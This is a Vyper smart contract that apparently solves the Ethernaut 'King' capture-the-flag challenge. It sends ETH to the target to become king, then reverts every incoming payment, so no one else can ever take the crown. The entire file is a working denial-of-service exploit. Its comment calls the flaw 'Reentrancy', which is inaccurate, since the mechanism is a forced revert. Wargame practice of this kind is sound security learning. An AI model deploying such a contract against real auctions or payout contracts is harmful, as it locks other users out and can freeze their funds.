# pragma version 0.4.0
"""
@license MIT
@title Ethernaut King challenge
@author s3bc40
"""

# Constants & Immutables
KING_CONTRACT: immutable(address)

@deploy
def __init__(king_contract: address):
    KING_CONTRACT = king_contract

@external
@payable
def claim_the_crown():
    raw_call(KING_CONTRACT, b"", value=msg.value)

@external
@payable
def __default__():
    """
    @dev 
        To solve the challenge we'll just revert at the send eth payable part 
        to trigger the Reentrancy issue since the code does not follow CEI 
    """
    raise "Long live the King!"
